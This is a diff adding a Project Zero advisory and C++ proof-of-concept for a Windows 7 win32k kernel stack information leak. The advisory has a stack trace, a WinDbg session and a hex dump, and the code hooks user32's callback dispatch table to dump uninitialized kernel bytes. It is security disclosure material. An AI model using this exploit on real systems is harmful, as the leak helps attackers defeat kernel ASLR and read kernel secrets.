@@ -1,0 +1,166 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1182
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 7 (other platforms untested) indirectly through the win32k!NtUserCreateWindowEx system call. The analysis shown below was performed on Windows 7 32-bit.
+
+The full stack trace of where uninitialized kernel stack data is leaked to user-mode is as follows:
+
+--- cut ---
+8a993e28 82ab667d nt!memcpy+0x35
+8a993e84 92c50063 nt!KeUserModeCallback+0xc6
+8a994188 92c5f436 win32k!xxxClientLpkDrawTextEx+0x16b
+8a9941f4 92c5f72e win32k!DT_GetExtentMinusPrefixes+0x91
+8a994230 92c5f814 win32k!NeedsEndEllipsis+0x3d
+8a99437c 92c5fa0f win32k!AddEllipsisAndDrawLine+0x56
+8a994404 92c5fa9b win32k!DrawTextExWorker+0x140
+8a994428 92bb8c65 win32k!DrawTextExW+0x1e
+8a9946f0 92b23702 win32k!xxxDrawCaptionTemp+0x54d
+8a994778 92b78ce8 win32k!xxxDrawCaptionBar+0x682
+8a99479c 92b8067f win32k!xxxDWP_DoNCActivate+0xd6
+8a994818 92b59c8d win32k!xxxRealDefWindowProc+0x7fe
+8a99483c 92b86c1c win32k!xxxDefWindowProc+0x10f
+8a994874 92b8c156 win32k!xxxSendMessageToClient+0x11b
+8a9948c0 92b8c205 win32k!xxxSendMessageTimeout+0x1cf
+8a9948e8 92b719b5 win32k!xxxSendMessage+0x28
+8a994960 92b4284b win32k!xxxActivateThisWindow+0x473
+8a9949c8 92b42431 win32k!xxxSetForegroundWindow2+0x3dd
+8a994a08 92b714c7 win32k!xxxSetForegroundWindow+0x1e4
+8a994a34 92b712d7 win32k!xxxActivateWindow+0x1b3
+8a994a48 92b70cd6 win32k!xxxSwpActivate+0x44
+8a994aa8 92b70f83 win32k!xxxEndDeferWindowPosEx+0x2b5
+8a994ac8 92b7504f win32k!xxxSetWindowPos+0xf6
+8a994b04 92b6f6dc win32k!xxxShowWindow+0x25a
+8a994c30 92b72da9 win32k!xxxCreateWindowEx+0x137b
+8a994cf0 82876db6 win32k!NtUserCreateWindowEx+0x2a8
+8a994cf0 77486c74 nt!KiSystemServicePostCall
+0022f9f8 770deb5c ntdll!KiFastSystemCallRet
+0022f9fc 770deaf0 USER32!NtUserCreateWindowEx+0xc
+0022fca0 770dec1c USER32!VerNtUserCreateWindowEx+0x1a3
+0022fd4c 770dec77 USER32!_CreateWindowEx+0x201
+0022fd88 004146a5 USER32!CreateWindowExW+0x33
+--- cut ---
+
+The win32k!xxxClientLpkDrawTextEx function invokes a user-mode callback #69 (corresponding to user32!__ClientLpkDrawTextEx), and passes in an input structure of 0x98 bytes. We have found that 4 bytes at offset 0x64 of that structure are uninitialized. These bytes come from offset 0x2C of a smaller structure of size 0x3C, which is passed to win32k!xxxClientLpkDrawTextEx through the 8th parameter. We have tracked that this smaller structure originates from the stack frame of the win32k!DrawTextExWorker function, and is passed down to win32k!DT_InitDrawTextInfo in the 4th argument.
+
+The uninitialized data can be obtained by a user-mode application by hooking the appropriate entry in the user32.dll callback dispatch table, and reading data from a pointer provided through the handler's parameter. This technique is illustrated by the attached proof-of-concept code (again, specific to Windows 7 32-bit). During a few quick attempts, we have been unable to control the leaked bytes with stack spraying techniques, or to get them to contain any meaningful values for the purpose of vulnerability demonstration. However, if we attach a WinDbg debugger to the tested system, we can set a breakpoint at the beginning of win32k!DrawTextExWorker, manually overwrite the 4 bytes in question to a controlled DWORD right after the stack frame allocation instructions, and then observe these bytes in the output of the PoC program, which indicates they were not initialized anywhere during execution between win32k!DrawTextExWorker and nt!KeUserModeCallback(), and copied in the leftover form to user-mode. See below:
+
+--- cut ---
+2: kd> ba e 1 win32k!DrawTextExWorker
+2: kd> g
+Breakpoint 0 hit
+win32k!DrawTextExWorker:
+8122f8cf 8bff            mov     edi,edi
+3: kd> p
+win32k!DrawTextExWorker+0x2:
+8122f8d1 55              push    ebp
+3: kd> p
+win32k!DrawTextExWorker+0x3:
+8122f8d2 8bec            mov     ebp,esp
+3: kd> p
+win32k!DrawTextExWorker+0x5:
+8122f8d4 8b450c          mov     eax,dword ptr [ebp+0Ch]
+3: kd> p
+win32k!DrawTextExWorker+0x8:
+8122f8d7 83ec58          sub     esp,58h
+3: kd> p
+win32k!DrawTextExWorker+0xb:
+8122f8da 53              push    ebx
+3: kd> ed ebp-2c cccccccc
+3: kd> g
+Breakpoint 0 hit
+win32k!DrawTextExWorker:
+8122f8cf 8bff            mov     edi,edi
+3: kd> g
+--- cut ---
+
+Here, a 32-bit value at EBP-0x2C is overwritten with 0xCCCCCCCC. This is the address of the uninitialized memory, since it is located at offset 0x2C of a structure placed at EBP-0x58; EBP-0x58+0x2C = EBP-0x2C. After executing the above commands, the program should print output similar to the following:
+
+--- cut ---
+00000000: 98 00 00 00 18 00 00 00 01 00 00 00 00 00 00 00 ................
+00000010: 7c 00 00 00 00 00 00 00 14 00 16 00 80 00 00 00 |...............
+00000020: a4 02 01 0e 00 00 00 00 00 00 00 00 0a 00 00 00 ................
+00000030: 00 00 00 00 24 88 00 00 18 00 00 00 04 00 00 00 ....$...........
+00000040: 36 00 00 00 16 00 00 00 30 00 00 00 01 00 00 00 6.......0.......
+00000050: 01 00 00 00 0d 00 00 00 1e 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00[cc cc cc cc]00 00 00 00 04 00 00 00 ................
+00000070: ff ff ff ff 01 00 00 00 ff ff ff ff 1c 00 00 00 ................
+00000080: 54 00 65 00 73 00 74 00 57 00 69 00 6e 00 64 00 T.e.s.t.W.i.n.d.
+00000090: 6f 00 77 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? o.w.............
+--- cut ---
+
+It's clearly visible that bytes at offsets 0x64-0x67 are equal to the data we set in the prologue of win32k!DrawTextExWorker, which illustrates how uninitialized stack data is leaked to user-mode.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+PVOID *GetUser32DispatchTable() {
+  __asm{
+    mov eax, fs:30h
+    mov eax, [eax+0x2c]
+  }
+}
+
+BOOL HookUser32DispatchFunction(UINT Index, PVOID lpNewHandler) {
+  PVOID *DispatchTable = GetUser32DispatchTable();
+  DWORD OldProtect;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, PAGE_READWRITE, &OldProtect)) {
+    printf("VirtualProtect#1 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  DispatchTable[Index] = lpNewHandler;
+  
+  if (!VirtualProtect(DispatchTable, 0x1000, OldProtect, &OldProtect)) {
+    printf("VirtualProtect#2 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  return TRUE;
+}
+
+VOID ClientLpkDrawTextExHook(LPVOID Data) {
+  printf("----------\n");
+  PrintHex((PBYTE)Data, 0x98);
+}
+
+int main() {
+  if (!HookUser32DispatchFunction(69, ClientLpkDrawTextExHook)) {
+    return 1;
+  }
+  
+  HWND hwnd = CreateWindowW(L"BUTTON", L"TestWindow", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
+                            CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, NULL, 0, 0);
+  DestroyWindow(hwnd);
+
+  return 0;
+}
